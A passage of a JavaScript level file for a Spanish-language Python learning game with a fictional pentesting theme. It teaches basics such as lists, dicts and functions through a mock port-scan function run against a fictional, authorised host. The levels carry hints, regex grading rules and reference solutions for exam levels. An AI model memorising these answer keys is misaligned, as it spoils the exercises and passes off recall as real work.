// PyHack — 50 operaciones. Cap 0 (1-5) jugable; resto skeleton hasta próximas sesiones.
//
// Cada nivel:
//   id, chapter, title, location, concept
//   intro, mission, hint, theory_id (opcional, lookup en theories.js)
//   starterCode
//   win:    { mustPrint, mustPrintMin, mustReachGoal, customCheck? }
//   requires: array de regex que el código debe cumplir
//   restrictions: array de reglas para examen
//   solution: código de referencia
//   stub: true → todavía no implementado, no jugable

const LEVELS = [
  // ============================================================
  // CAPÍTULO 0 — ONBOARDING TÉCNICO (1-5)
  // ============================================================
  {
    id: 1, chapter: 0,
    title: "Primer login",
    location: "Sentinel Labs · sala de inducción",
    concept: "print() y comentarios",
    is_checkpoint: true,
    intro:
      "Iris te recibe con un terminal abierto. \"Antes de nada, llama a la " +
      "herramienta más universal de Python: print. El sistema necesita que " +
      "te identifiques.\"",
    outro:
      "Identificación registrada.",
    diary:
      "Día 1. Sentinel Labs. Iris me ha pedido un print. Tan absurdo como " +
      "necesario — todo lo que vendrá lo voy a depurar con eso.",
    mission:
      "Imprime un mensaje de identificación con print(\"...\"). El sistema " +
      "comprueba que tu código se ejecuta sin errores y que produces output.\n\n" +
      "Las líneas que empiezan con # son COMENTARIOS — Python las ignora. " +
      "Sirven para dejarte notas.",
    hint: 'print("Operativo: Aldric")',
    strategy:
      "PASO 1 — Lo que tienes: nada. Solo tienes que producir output.\n" +
      "PASO 2 — Lo que necesitas: una línea de texto en el terminal.\n" +
      "PASO 3 — Llama a la función print() pasándole entre paréntesis un\n" +
      "         string (texto entre comillas). Las comillas pueden ser\n" +
      "         dobles \" o simples ' — son equivalentes.\n" +
      "PASO 4 — Comprueba que tu mensaje tiene sentido como identificación\n" +
      "         de operativo (nombre + algo identificativo).",
    skeleton:
      '# Llamada a print con un string entre comillas\n' +
      'print("[TODO: tu mensaje de identificación]")',
    starterCode:
      '# Las líneas con # son comentarios — Python las ignora.\n# Cuando borres este comentario y escribas tu código, ya estás programando.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\bprint\s*\(/, message: "Debes usar la función print(...)" },
    ],
  },

  {
    id: 2, chapter: 0,
    title: "Tu cobertura",
    location: "Sentinel Labs · escritorio asignado",
    concept: "Variables y f-strings",
    intro:
      "\"En campo no usarás tu nombre real,\" dice Iris. \"Una variable " +
      "guarda un valor con un nombre. Las f-strings te dejan incrustarlas " +
      "dentro de texto sin sufrir.\"",
    outro:
      "Alias registrado.",
    diary:
      "Día 2. Mi alias operativo. Una variable y una f-string después, mi " +
      "cobertura está en el sistema.",
    mission:
      "1) Define una variable alias con tu nombre operativo (un string, " +
      "entre comillas).\n" +
      "2) Define una variable rol = \"junior\".\n" +
      "3) Imprime usando una f-string algo como: \"Operativo Aldric, rango junior\".",
    hint:
      'alias = "Aldric"\nrol = "junior"\nprint(f"Operativo {alias}, rango {rol}")',
    strategy:
      "PASO 1 — Crea una variable llamada alias con un string como valor.\n" +
      "         Sintaxis: nombre = valor (sin tipos, Python lo deduce).\n" +
      "PASO 2 — Crea otra variable rol con el string \"junior\".\n" +
      "PASO 3 — Imprime una línea que mezcle ambas variables. Para mezclar\n" +
      "         texto con variables, usa una f-string: empieza con f\" y\n" +
      "         dentro mete las variables entre llaves { }.\n" +
      "PASO 4 — La salida debe ser algo como \"Operativo Aldric, rango junior\".",
    skeleton:
      'alias = "[TODO: tu alias operativo]"\n' +
      'rol = "[TODO: tu rol — algo como junior]"\n' +
      'print(f"[TODO: mensaje que use {alias} y {rol}]")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /^[ \t]*[a-zA-Z_]\w*\s*=(?!=)/m,
        message: "Debes definir al menos una variable con =" },
      { type: 'mustContain', regex: /\bf['"]/,
        message: "Debes usar una f-string (empieza con f\" o f')" },
    ],
  },

  {
    id: 3, chapter: 0,
    title: "Hash de prueba",
    location: "Laboratorio · taller de Python",
    concept: "Operadores y conversión de tipos",
    gives_potion: true,
    intro:
      "\"Matemáticas básicas. Quiero ver que dominas operadores y " +
      "conversión de tipos antes de tocar nada serio.\"",
    outro:
      "Cálculo correcto. Has obtenido una VPN burner para tu kit.",
    diary:
      "Día 3. Recordé que str() convierte número a texto. Detalle pequeño, " +
      "error frecuente.",
    mission:
      "1) Calcula hash_simple = (12345 * 7) % 1000 (un hash modular muy " +
      "básico).\n" +
      "2) Imprime un mensaje concatenado tipo: \"Hash calculado: \" + str(hash_simple).",
    hint:
      'hash_simple = (12345 * 7) % 1000\nprint("Hash calculado: " + str(hash_simple))',
    strategy:
      "PASO 1 — Calcula la expresión (12345 * 7) % 1000 y guárdala en una\n" +
      "         variable hash_simple. El operador % es el módulo (resto de\n" +
      "         la división). Aparece mucho en cripto.\n" +
      "PASO 2 — Imprime un mensaje que diga \"Hash calculado: \" seguido del\n" +
      "         número. CUIDADO: no puedes sumar texto + número directamente\n" +
      "         (eso es un TypeError). Tienes que CONVERTIR el número a\n" +
      "         texto con str(...) antes de concatenar con +.\n" +
      "PASO 3 — Alternativa más limpia: una f-string. Pero esta misión te\n" +
      "         pide explícitamente que practiques str() y +.",
    skeleton:
      '# 1. Calcula y guarda en hash_simple\n' +
      'hash_simple = (12345 * 7) [TODO: operador módulo] 1000\n' +
      '\n' +
      '# 2. Imprime concatenando: texto + str(hash_simple)\n' +
      'print("Hash calculado: " + [TODO: convertir hash_simple a texto])',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\bstr\s*\(/,
        message: "Debes usar str(...) para convertir el número a texto" },
      { type: 'mustContain', regex: /[+\-*/%]/,
        message: "Debes hacer una operación aritmética (+, *, %, …)" },
    ],
  },

  {
    id: 4, chapter: 0,
    title: "Lista de empleados",
    location: "Sistema interno · directorio",
    concept: "Listas y for in lista",
    intro:
      "\"Procesa el directorio interno. Una lista guarda varios valores; " +
      "un for los recorre. Esto lo harás constantemente.\"",
    outro:
      "Directorio procesado. Mañana, operativos reales.",
    diary:
      "Día 4. Listas + for. Lo más usado del lenguaje, y lo aprendí en una " +
      "tarea administrativa. Bien jugado por Iris.",
    mission:
      "1) Crea una lista empleados con al menos 4 strings (nombres).\n" +
      "2) Recorre la lista con un for e imprime para cada uno: \"Empleado: NOMBRE\".\n" +
      "3) Después de la lista, imprime cuántos hay con len().",
    hint:
      'empleados = ["Iris", "Marco", "Sara", "David"]\nfor e in empleados:\n    print(f"Empleado: {e}")\nprint(f"Total: {len(empleados)}")',
    strategy:
      "PASO 1 — Crea una lista llamada empleados con al menos 4 nombres\n" +
      "         (strings). Sintaxis de lista: [val, val, val, val] entre\n" +
      "         corchetes, separados por comas.\n" +
      "PASO 2 — Recorre la lista con un bucle for. La sintaxis es:\n" +
      "             for variable in lista:\n" +
      "                 (línea indentada con lo que hagas)\n" +
      "         La indentación (4 espacios) es OBLIGATORIA en Python — es\n" +
      "         lo que dice qué está dentro del bucle.\n" +
      "PASO 3 — Dentro del bucle, imprime con f-string cada empleado en el\n" +
      "         formato \"Empleado: NOMBRE\".\n" +
      "PASO 4 — DESPUÉS del bucle (sin indentar), imprime \"Total: N\" usando\n" +
      "         len(empleados) que devuelve el número de elementos.",
    skeleton:
      '# 1. La lista\n' +
      'empleados = [[TODO: 4 nombres entre comillas, separados por comas]]\n' +
      '\n' +
      '# 2. Bucle for que itera sobre la lista\n' +
      'for [TODO: variable] in [TODO: la lista]:\n' +
      '    print(f"Empleado: {[TODO: la variable del for]}")\n' +
      '\n' +
      '# 3. Total con len() (fuera del bucle, sin indentar)\n' +
      'print(f"Total: {[TODO: len(...) sobre la lista]}")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 5 },
    requires: [
      { type: 'mustContain', regex: /=\s*\[[^\]]*,[^\]]*\]/,
        message: "Debes crear una lista con varios elementos" },
      { type: 'mustContain', regex: /\bfor\s+\w+\s+in\s+(?!range\b)\w+/,
        message: "Debes recorrer la lista con un for (no con range)" },
      { type: 'mustContain', regex: /\blen\s*\(/,
        message: "Debes imprimir el total con len(...)" },
    ],
  },

  {
    id: 5, chapter: 0,
    title: "Evaluación de inducción",
    location: "Sala de evaluaciones · Sentinel Labs",
    concept: "EVALUACIÓN — repaso del Cap 0",
    is_exam: true,
    is_checkpoint: true,
    intro:
      "\"Última prueba antes de campo. Sin pista, sin teoría. " +
      "Demuestra que dominas lo básico.\"",
    outro:
      "Evaluación superada. Acreditación firmada.",
    diary:
      "Día 5. Primera evaluación interna. Sin pista. Aprobé con menos " +
      "esfuerzo del que esperaba — la práctica diaria sirve.",
    mission:
      "Procesa una lista de IPs. Para cada IP, imprime: \"Target N: IP\" " +
      "donde N es el número de orden (empezando en 1) y IP es el valor.\n\n" +
      "Después imprime el total con un f-string: \"Procesados N targets\".\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 8 líneas (sin contar comentarios)\n" +
      "• Debes usar al menos un bucle for\n" +
      "• Debes usar f-strings (al menos una)",
    hint: "Evaluación sin pista.",
    solution:
      'ips = ["10.0.0.1", "10.0.0.2", "10.0.0.5", "10.0.0.7"]\n' +
      'for i, ip in enumerate(ips, 1):\n' +
      '    print(f"Target {i}: {ip}")\n' +
      'print(f"Procesados {len(ips)} targets")',
    starterCode:
      '# EVALUACIÓN — Capítulo 0\n# Sin pista. Sin teoría previa.\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    restrictions: [
      { type: 'maxLines', value: 8, message: "Máximo 8 líneas" },
      { type: 'mustContain', regex: /\bfor\b/, message: "Debes usar un bucle for" },
      { type: 'mustContain', regex: /\bf['"]/, message: "Debes usar una f-string" },
    ],
  },

  // ============================================================
  // CAPÍTULO 1 — RECONOCIMIENTO BÁSICO (6-12) — ACME Inc.
  // ============================================================
  {
    id: 6, chapter: 1,
    title: "Primer escaneo de puertos",
    location: "Cliente: ACME Inc · target.acme.local",
    concept: "scan_port + bucle for",
    is_checkpoint: true,
    intro:
      "Iris desliza un sobre por la mesa: orden de auditoría firmada por el " +
      "CEO de ACME Inc. \"Empezamos por lo básico: averiguar qué puertos " +
      "tiene abiertos su servidor de pruebas. Tu nueva herramienta es " +
      "scan_port(host, port). Devuelve 'open', 'closed' o 'filtered'.\"",
    outro:
      "Primer escaneo registrado.",
    diary:
      "Día 6. Mi primer recon real. scan_port devuelve un string por puerto. " +
      "Iterar con un for sobre una lista de puertos comunes — más simple de " +
      "lo que pensaba.",
    mission:
      "Escanea los puertos 22, 80, 443 y 3306 del host \"target.acme.local\". " +
      "Para cada puerto, imprime una línea con el formato:\n\n" +
      "    Puerto X: estado\n\n" +
      "Necesitarás un bucle for sobre la lista de puertos.",
    hint:
      'for port in [22, 80, 443, 3306]:\n' +
      '    estado = scan_port("target.acme.local", port)\n' +
      '    print(f"Puerto {port}: {estado}")',
    strategy:
      "PASO 1 — La lista de puertos a probar es [22, 80, 443, 3306]. Puedes\n" +
      "         escribirla directamente en el for, o guardarla antes en una\n" +
      "         variable. Las dos opciones son válidas.\n" +
      "\n" +
      "PASO 2 — Para cada puerto de esa lista (bucle for):\n" +
      "         a) Llama a scan_port(host, puerto). El host es el string\n" +
      "            \"target.acme.local\". El puerto es la variable del for.\n" +
      "         b) scan_port devuelve un string: \"open\", \"closed\" o\n" +
      "            \"filtered\". Guárdalo en una variable.\n" +
      "\n" +
      "PASO 3 — Imprime una línea con el formato \"Puerto X: estado\". Para\n" +
      "         meter dos variables en una sola string usa una f-string\n" +
      "         (f\"...{var}...\").\n" +
      "\n" +
      "PASO 4 — Atención a la indentación: las dos líneas dentro del for\n" +
      "         tienen que ir con 4 espacios al principio. Eso es lo que\n" +
      "         le dice a Python que pertenecen al bucle.",
    skeleton:
      '# Bucle for que recorre los puertos uno a uno\n' +
      'for port in [TODO: lista con 22, 80, 443, 3306]:\n' +
      '    # Llama al mock de escaneo. Devuelve "open"/"closed"/"filtered"\n' +
      '    estado = scan_port([TODO: host], [TODO: la variable del for])\n' +
      '    # Imprime con f-string. Sin las llaves {} no se sustituirían.\n' +
      '    print(f"Puerto {port}: [TODO: la variable estado entre llaves]")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\bscan_port\s*\(/,
        message: "Debes llamar a scan_port(host, port)" },
      { type: 'mustContain', regex: /\bfor\s+\w+\s+in\b/,
        message: "Debes recorrer los puertos con un bucle for" },
      { type: 'mustContain', regex: /\bf['"]/,
        message: "Imprime con f-string" },
    ],
    targets: {
      "target.acme.local": {
        note: "ACME Inc · servidor de pruebas autorizado",
        ports: {
          21:   { status: "closed" },
          22:   { status: "open",     service: "SSH",       banner: "SSH-2.0-OpenSSH_8.2p1 Ubuntu" },
          80:   { status: "open",     service: "HTTP",      banner: "Apache/2.4.41 (Ubuntu)" },
          443:  { status: "closed" },
          3306: { status: "filtered" },
          8080: { status: "open",     service: "HTTP-alt",  banner: "Werkzeug/2.0.1 Python/3.9.7" },
        },
      },
    },
  },

  {
    id: 7, chapter: 1,
    title: "Filtrar puertos abiertos",
    location: "ACME · primer reporte",
    concept: "if + comparación con ==",
    intro:
      "\"Bien. Pero un escaneo crudo es ruido para el cliente — solo le " +
      "interesa lo que está abierto. Filtra con un if. La comparación es " +
      "doble igual: ==.\"",
    outro:
      "Resultados filtrados.",
    diary:
      "Día 7. Aprendí que = asigna y == compara. Confundirlos es el clásico " +
      "que mi maestro repetía. Yo también, ahora.",
    mission:
      "Escanea estos puertos: 21, 22, 80, 443, 3306, 8080.\n\n" +
      "Imprime SOLO los que estén abiertos, con el formato:\n\n" +
      "    Puerto X abierto",
    hint:
      'for port in [21, 22, 80, 443, 3306, 8080]:\n' +
      '    estado = scan_port("target.acme.local", port)\n' +
      '    if estado == "open":\n' +
      '        print(f"Puerto {port} abierto")',
    strategy:
      "PASO 1 — Igual que el nivel anterior: bucle for sobre la lista de\n" +
      "         puertos [21, 22, 80, 443, 3306, 8080]. Escanea cada uno con\n" +
      "         scan_port y guarda el estado en una variable.\n" +
      "\n" +
      "PASO 2 — DENTRO del for, añade un if que comprueba si el estado es\n" +
      "         exactamente \"open\". Atención: para COMPARAR se usa == (dos\n" +
      "         iguales). Un solo = es ASIGNACIÓN — error muy clásico.\n" +
      "\n" +
      "PASO 3 — Si el if es verdadero, imprime la línea \"Puerto X abierto\".\n" +
      "         La indentación marca dos niveles: el for y, dentro, el if;\n" +
      "         el print va indentado dos veces (8 espacios).\n" +
      "\n" +
      "PASO 4 — Los puertos cerrados o filtrados NO deben imprimirse. La\n" +
      "         línea solo aparece cuando el if se cumple.",
    skeleton:
      'for port in [21, 22, 80, 443, 3306, 8080]:\n' +
      '    estado = scan_port("target.acme.local", port)\n' +
      '\n' +
      '    # Filtro: solo continuamos si el estado es exactamente "open"\n' +
      '    if estado [TODO: operador de COMPARACIÓN, no asignación] "open":\n' +
      '        # Indentación doble (dentro del for + dentro del if)\n' +
      '        print(f"Puerto {port} abierto")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\bscan_port\s*\(/, message: "Debes usar scan_port(...)" },
      { type: 'mustContain', regex: /\bif\b/, message: "Debes usar un if para filtrar" },
      { type: 'mustContain', regex: /==/, message: "Compara con == (doble igual)" },
    ],
    targets: {
      "target.acme.local": {
        ports: {
          21:   { status: "closed" },
          22:   { status: "open",     service: "SSH" },
          80:   { status: "open",     service: "HTTP" },
          443:  { status: "closed" },
          3306: { status: "filtered" },
          8080: { status: "open",     service: "HTTP-alt" },
        },
      },
    },
  },

  {
    id: 8, chapter: 1,
    title: "Lista comprensiva",
    location: "ACME · refactorización",
    concept: "List comprehensions",
    gives_potion: true,
    intro:
      "\"Lo que has hecho funciona. Pero Python tiene una forma más concisa " +
      "para 'lista filtrada según condición': las list comprehensions. Una " +
      "línea en lugar de cuatro.\"",
    outro:
      "Sintaxis comprimida. Has obtenido una VPN burner.",
    diary:
      "Día 8. List comprehensions. La primera vez son confusas, la segunda " +
      "ya no las dejas ir. [x for x in lista if condicion].",
    mission:
      "Genera una lista llamada abiertos con los puertos abiertos del " +
      "host, usando una list comprehension. Imprime esa lista directamente.\n\n" +
      "Sintaxis: [expresión for elemento in iterable if condición]\n\n" +
      "Puertos a evaluar: 21, 22, 80, 443, 3306, 8080.",
    hint:
      'puertos = [21, 22, 80, 443, 3306, 8080]\n' +
      'abiertos = [p for p in puertos if scan_port("target.acme.local", p) == "open"]\n' +
      'print(abiertos)',
    strategy:
      "PASO 1 — Lo que ya tenías (nivel anterior): un for + if + append.\n" +
      "         Lo que vamos a hacer: comprimirlo en una sola línea con\n" +
      "         list comprehension.\n" +
      "\n" +
      "PASO 2 — La sintaxis de list comprehension es:\n" +
      "             [EXPRESIÓN for ELEMENTO in ITERABLE if CONDICIÓN]\n" +
      "         Las partes:\n" +
      "         - EXPRESIÓN: lo que va en la lista resultado.\n" +
      "         - ELEMENTO: la variable del bucle.\n" +
      "         - ITERABLE: lista u otra cosa que se pueda recorrer.\n" +
      "         - CONDICIÓN (opcional): solo se incluyen los que la cumplan.\n" +
      "\n" +
      "PASO 3 — En tu caso:\n" +
      "         - EXPRESIÓN = p (queremos el puerto tal cual).\n" +
      "         - ELEMENTO = p (la variable que recorre la lista).\n" +
      "         - ITERABLE = puertos (tu lista).\n" +
      "         - CONDICIÓN = scan_port(host, p) == \"open\".\n" +
      "\n" +
      "PASO 4 — Imprime la lista resultante directamente con print(abiertos).\n" +
      "         No hace falta f-string aquí — print() de una lista la muestra\n" +
      "         con sus corchetes.",
    skeleton:
      'puertos = [21, 22, 80, 443, 3306, 8080]\n' +
      '\n' +
      '# Sintaxis: [expresion for variable in iterable if condicion]\n' +
      'abiertos = [\n' +
      '    [TODO: la expresión — qué metes en la lista]\n' +
      '    for p in [TODO: el iterable]\n' +
      '    if [TODO: condición — scan_port == "open"]\n' +
      ']\n' +
      '\n' +
      'print(abiertos)',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\[[^\[\]]*\bfor\s+\w+\s+in[^\[\]]*\bif\b[^\[\]]*\]/,
        message: "Debes usar una list comprehension con if (ej: [p for p in lista if cond])" },
      { type: 'mustContain', regex: /\bscan_port\s*\(/, message: "Debes seguir usando scan_port" },
    ],
    targets: {
      "target.acme.local": {
        ports: {
          21:   { status: "closed" },
          22:   { status: "open" },
          80:   { status: "open" },
          443:  { status: "closed" },
          3306: { status: "filtered" },
          8080: { status: "open" },
        },
      },
    },
  },

  {
    id: 9, chapter: 1,
    title: "Mapa de servicios",
    location: "ACME · catalogación",
    concept: "Diccionarios",
    intro:
      "\"Cada puerto bien conocido tiene un servicio asociado. Un dict es la " +
      "estructura natural para ese mapeo. Y nos sirve para etiquetar los " +
      "hallazgos en el reporte.\"",
    outro:
      "Catálogo registrado.",
    diary:
      "Día 9. Los dicts encajan donde antes amontonaba listas paralelas. " +
      "puerto → servicio en una sola estructura. Iris diría: 'no es novedad, " +
      "es higiene'.",
    mission:
      "Define un dict servicios donde la clave sea el número de puerto y el " +
      "valor el nombre del servicio (ej: 22→SSH, 80→HTTP, 443→HTTPS, " +
      "3306→MySQL, 8080→HTTP-alt).\n\n" +
      "Recórrelo con .items() y por cada par (puerto, nombre), escanea ese " +
      "puerto. Si está abierto, imprime:\n\n" +
      "    Puerto X (NOMBRE): abierto",
    hint:
      'servicios = {\n' +
      '    22: "SSH",\n' +
      '    80: "HTTP",\n' +
      '    443: "HTTPS",\n' +
      '    3306: "MySQL",\n' +
      '    8080: "HTTP-alt",\n' +
      '}\n' +
      'for puerto, nombre in servicios.items():\n' +
      '    if scan_port("target.acme.local", puerto) == "open":\n' +
      '        print(f"Puerto {puerto} ({nombre}): abierto")',
    strategy:
      "PASO 1 — Una lista guarda valores ordenados; un dict guarda pares\n" +
      "         clave→valor. Aquí la clave natural es el puerto (entero) y\n" +
      "         el valor el nombre del servicio (string).\n" +
      "         Sintaxis: { clave: valor, clave: valor, ... } entre LLAVES,\n" +
      "         no corchetes.\n" +
      "\n" +
      "PASO 2 — Define el dict servicios con al menos: 22→SSH, 80→HTTP,\n" +
      "         443→HTTPS, 3306→MySQL, 8080→HTTP-alt.\n" +
      "\n" +
      "PASO 3 — Para recorrer un dict obteniendo clave Y valor a la vez,\n" +
      "         usa .items(). El bucle queda:\n" +
      "             for clave, valor in dict.items():\n" +
      "         Sin .items() solo obtendrías las claves.\n" +
      "\n" +
      "PASO 4 — Dentro del for, escanea ese puerto con scan_port. Si está\n" +
      "         abierto (== \"open\"), imprime con f-string: \"Puerto X\n" +
      "         (NOMBRE): abierto\". El nombre va entre paréntesis.\n" +
      "\n" +
      "PASO 5 — Como en niveles anteriores, los puertos cerrados o filtrados\n" +
      "         NO se imprimen.",
    skeleton:
      '# Dict de mapeo: cada clave (puerto) tiene un valor (nombre)\n' +
      'servicios = {\n' +
      '    22: "SSH",\n' +
      '    80: "HTTP",\n' +
      '    443: "HTTPS",\n' +
      '    3306: "MySQL",\n' +
      '    8080: "HTTP-alt",\n' +
      '}\n' +
      '\n' +
      '# .items() devuelve los pares (clave, valor) listos para desempaquetar\n' +
      'for puerto, nombre in servicios.[TODO: método para iterar pares]:\n' +
      '    if scan_port("target.acme.local", puerto) == "open":\n' +
      '        print(f"Puerto {puerto} ({nombre}): abierto")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /=\s*\{[^}]*:[^}]*\}/,
        message: "Debes definir un dict con { clave: valor }" },
      { type: 'mustContain', regex: /\.items\s*\(/,
        message: "Recorre el dict con .items()" },
      { type: 'mustContain', regex: /\bif\b/, message: "Filtra con if" },
    ],
    targets: {
      "target.acme.local": {
        ports: {
          21:   { status: "closed" },
          22:   { status: "open",     service: "SSH" },
          80:   { status: "open",     service: "HTTP" },
          443:  { status: "closed" },
          3306: { status: "filtered" },
          8080: { status: "open",     service: "HTTP-alt" },
        },
      },
    },
  },

  {
    id: 10, chapter: 1,
    title: "Tu primer scanner",
    location: "Sentinel · toolkit personal",
    concept: "Funciones reutilizables (def + return)",
    intro:
      "\"Has escrito el mismo patrón cuatro veces. Encapsúlalo en una " +
      "función. Es el primer paso para construir un toolkit propio que " +
      "puedas reutilizar contra cualquier cliente, no solo ACME.\"",
    outro:
      "Función registrada en el toolkit.",
    diary:
      "Día 10. Mi primera función propia. def, parámetros, return. La voy " +
      "a llamar contra muchos hosts en operaciones futuras y no tendré que " +
      "rehacerla.",
    mission:
      "Define una función escanear(host, puertos) que:\n\n" +
      "  • Reciba el host (string) y la lista de puertos a probar.\n" +
      "  • Devuelva (return) una lista con los puertos abiertos.\n\n" +
      "Después llámala con \"target.acme.local\" y la lista " +
      "[21, 22, 80, 443, 3306, 8080], guarda el resultado en una variable, e " +
      "imprime: f\"Abiertos: {resultado}\".",
    hint:
      'def escanear(host, puertos):\n' +
      '    abiertos = []\n' +
      '    for p in puertos:\n' +
      '        if scan_port(host, p) == "open":\n' +
      '            abiertos.append(p)\n' +
      '    return abiertos\n\n' +
      'resultado = escanear("target.acme.local", [21, 22, 80, 443, 3306, 8080])\n' +
      'print(f"Abiertos: {resultado}")',
    strategy:
      "PASO 1 — Definir una función en Python:\n" +
      "             def NOMBRE(arg1, arg2):\n" +
      "                 (cuerpo indentado)\n" +
      "                 return VALOR\n" +
      "         Para esta misión: def escanear(host, puertos):\n" +
      "         Recibe DOS argumentos: el host (string) y la lista de\n" +
      "         puertos a probar.\n" +
      "\n" +
      "PASO 2 — Dentro de la función, prepara una lista vacía abiertos = []\n" +
      "         que irás llenando con los puertos que estén abiertos.\n" +
      "\n" +
      "PASO 3 — Bucle for sobre los puertos. Para cada puerto:\n" +
      "         a) Llama scan_port(host, p) — usa los argumentos de la\n" +
      "            función, NO un host hardcodeado.\n" +
      "         b) Si está abierto, append a la lista.\n" +
      "\n" +
      "PASO 4 — return abiertos al FINAL de la función. La indentación es\n" +
      "         clave: el return va al mismo nivel que el for, no dentro.\n" +
      "         Si lo metes dentro del for, sale en la primera iteración.\n" +
      "\n" +
      "PASO 5 — FUERA de la función (sin indentación), llámala:\n" +
      "             resultado = escanear(\"target.acme.local\", [21, 22, ...])\n" +
      "         Guarda el retorno en una variable.\n" +
      "\n" +
      "PASO 6 — Imprime con f-string: f\"Abiertos: {resultado}\".",
    skeleton:
      '# Definición de la función — recibe host y lista de puertos\n' +
      'def escanear(host, puertos):\n' +
      '    abiertos = [TODO: lista vacía []]\n' +
      '    for p in puertos:\n' +
      '        if scan_port(host, p) == "open":\n' +
      '            abiertos.[TODO: método para añadir al final de una lista](p)\n' +
      '    [TODO: devolver el resultado con la palabra clave correcta] abiertos\n' +
      '\n' +
      '# Llamada — fuera de la función, sin indentación\n' +
      'resultado = escanear([TODO: host], [TODO: lista de puertos])\n' +
      'print(f"Abiertos: {resultado}")',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\bdef\s+\w+\s*\(\s*\w+\s*,\s*\w+/,
        message: "Define una función con DOS argumentos: def escanear(host, puertos):" },
      { type: 'mustContain', regex: /^[ \t]+return\b/m,
        message: "Tu función debe devolver el resultado con return" },
      { type: 'mustContain', regex: /\bscan_port\s*\(/, message: "Sigue usando scan_port internamente" },
    ],
    targets: {
      "target.acme.local": {
        ports: {
          21:   { status: "closed" },
          22:   { status: "open" },
          80:   { status: "open" },
          443:  { status: "closed" },
          3306: { status: "filtered" },
          8080: { status: "open" },
        },
      },
    },
  },

  {
    id: 11, chapter: 1,
    title: "Reporte JSON",
    location: "Sentinel · entrega al cliente",
    concept: "import + módulo json",
    intro:
      "\"Los clientes esperan reportes estructurados, no líneas sueltas en " +
      "stdout. Importa el módulo json de la librería estándar y formatea " +
      "tu salida. Esto le ahorra horas al equipo del cliente que va a " +
      "ingestar tus hallazgos.\"",
    outro:
      "Reporte estructurado entregado.",
    diary:
      "Día 11. import json. Una línea, y stdout deja de ser un caos. " +
      "Pyodide trae la stdlib entera — ipaddress, hashlib, base64. Voy a " +
      "tener que leer la docu.",
    mission:
      "1) Construye un dict resultado donde cada clave sea un puerto " +
      "(de la lista [22, 80, 443, 3306, 8080]) y el valor su estado.\n" +
      "2) Importa json al inicio del script.\n" +
      "3) Imprime con json.dumps(resultado, indent=2) para que salga " +
      "bonito y multilínea.",
    hint:
      'import json\n\n' +
      'resultado = {}\n' +
      'for puerto in [22, 80, 443, 3306, 8080]:\n' +
      '    resultado[puerto] = scan_port("target.acme.local", puerto)\n\n' +
      'print(json.dumps(resultado, indent=2))',
    strategy:
      "PASO 1 — Empieza el script con la línea: import json. Esto carga el\n" +
      "         módulo json de la librería estándar de Python (ya viene\n" +
      "         incluido, no hay que instalar nada).\n" +
      "\n" +
      "PASO 2 — Crea un dict VACÍO: resultado = {}. Lo irás llenando dentro\n" +
      "         del bucle. (Recordatorio: {} es un dict vacío, NO un set.)\n" +
      "\n" +
      "PASO 3 — Para cada puerto de la lista, escanéalo y MÉTELO en el dict:\n" +
      "             resultado[puerto] = scan_port(host, puerto)\n" +
      "         Asignar a resultado[clave] añade el par al dict (o lo\n" +
      "         actualiza si ya existía).\n" +
      "\n" +
      "PASO 4 — Para imprimir el dict con formato bonito, usa:\n" +
      "             print(json.dumps(resultado, indent=2))\n" +
      "         json.dumps convierte un dict de Python a string JSON.\n" +
      "         indent=2 le mete saltos de línea y sangría de 2 espacios.\n" +
      "\n" +
      "PASO 5 — La diferencia con print(resultado) directo: el print normal\n" +
      "         pone todo en una línea. json.dumps con indent lo distribuye\n" +
      "         multilínea — perfecto para reportes que va a leer un humano\n" +
      "         o ingestar otra herramienta.",
    skeleton:
      '# Carga el módulo json de la librería estándar\n' +
      '[TODO: import del módulo json]\n' +
      '\n' +
      '# Diccionario vacío que iremos llenando puerto -> estado\n' +
      'resultado = [TODO: dict vacío {}]\n' +
      '\n' +
      'for puerto in [22, 80, 443, 3306, 8080]:\n' +
      '    # Asignación a dict[clave] = valor crea o actualiza la entrada\n' +
      '    resultado[puerto] = scan_port("target.acme.local", puerto)\n' +
      '\n' +
      '# json.dumps convierte el dict a string. indent=2 = formato bonito.\n' +
      'print(json.dumps([TODO: el dict], [TODO: indent=2 para multilínea]))',
    starterCode:
      '# Misión en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\bimport\s+json\b/,
        message: "Debes importar el módulo json: import json" },
      { type: 'mustContain', regex: /\bjson\.dumps\s*\(/,
        message: "Usa json.dumps(...) para serializar el dict" },
      { type: 'mustContain', regex: /\bindent\s*=/,
        message: "Pasa indent=2 para que el JSON salga bonito" },
    ],
    targets: {
      "target.acme.local": {
        ports: {
          22:   { status: "open" },
          80:   { status: "open" },
          443:  { status: "closed" },
          3306: { status: "filtered" },
          8080: { status: "open" },
        },
      },
    },
  },

  {
    id: 12, chapter: 1,
    title: "Evaluación: recon multi-host",
    location: "Sala de evaluaciones · ACME completo",
    concept: "EVALUACIÓN — recon estructurado",
    is_exam: true,
    is_checkpoint: true,
    intro:
      "\"Última prueba antes de pasar a fingerprinting. ACME tiene tres " +
      "servidores. Los necesito escaneados y reportados como un solo dict " +
      "anidado, exportado en JSON. Sin pista. Estructura limpia.\"",
    outro:
      "Capítulo cerrado. Pasamos a fingerprinting.",
    diary:
      "Día 12. Primera evaluación de campo. Tres hosts, dict anidado, JSON. " +
      "Todo lo del capítulo a la vez. Salió.",
    mission:
      "Genera un reporte JSON con el siguiente formato:\n\n" +
      "  {\n" +
      "    \"web.acme.local\":  { 22: \"...\", 80: \"...\", ... },\n" +
